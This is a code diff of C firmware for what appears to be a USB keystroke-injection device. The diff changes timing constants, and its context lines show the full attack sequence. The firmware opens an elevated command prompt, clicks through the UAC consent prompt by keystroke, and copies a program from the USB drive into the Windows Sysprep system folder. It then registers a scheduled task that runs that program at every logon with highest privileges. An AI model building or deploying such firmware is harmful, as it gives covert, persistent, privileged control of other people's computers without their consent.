@@ -185,11 +185,10 @@ static const uint8_t hid_ascii_shift[128] = {
 
 
 // Typing speed, lower the more buggy
-#define WAIT_STRING 1
-#define KEY_RELEASE 3
+#define WAIT_STRING 2
+#define KEY_RELEASE 4
 
-#define WAIT_PROGRAMS_FAST 50
-#define WAIT_PROGRAMS_SLOW 500
+#define WAIT_PROGRAMS 100
 
 // path to download app
 #define WINDOWS_FILEPATH "C:\\Windows\\System32\\Sysprep\\"
@@ -252,18 +251,18 @@ int main(void)
 	initialiser();
 
 	type_char_with_mods('r', MOD_WIN);
-	sleep_ms(WAIT_PROGRAMS_FAST);
+	sleep_ms(WAIT_PROGRAMS);
 	
 	type_string("cmd");
-	sleep_ms(WAIT_PROGRAMS_FAST);
+	sleep_ms(WAIT_PROGRAMS);
 
 	type_char_with_mods('\n', MOD_CTRL | MOD_SHIFT);
-	sleep_ms(WAIT_PROGRAMS_SLOW);
+	sleep_ms(WAIT_PROGRAMS * 10);
 
 	type_char(ASCII_ARROW_LEFT);
-	sleep_ms(WAIT_PROGRAMS_FAST);
+	sleep_ms(WAIT_PROGRAMS);
 	enter();
-  sleep_ms(WAIT_PROGRAMS_SLOW);
+  sleep_ms(WAIT_PROGRAMS * 7);
 
   type_string("copy ");
   type_string(USB_FILEPATH);
@@ -271,7 +270,7 @@ int main(void)
   type_char(' ');
   type_string(WINDOWS_FILEPATH);
   enter();
-  sleep_ms(WAIT_PROGRAMS_FAST);
+  sleep_ms(WAIT_PROGRAMS);
 
   type_string("schtasks /create /sc onlogon /tn \"");
   type_string(APP_NAME);
@@ -280,7 +279,7 @@ int main(void)
   type_string(APP_NAME);
   type_string("\" /rl highest /f");
   enter();
-  sleep_ms(WAIT_PROGRAMS_FAST);
+  sleep_ms(WAIT_PROGRAMS);
   close();
 
 }
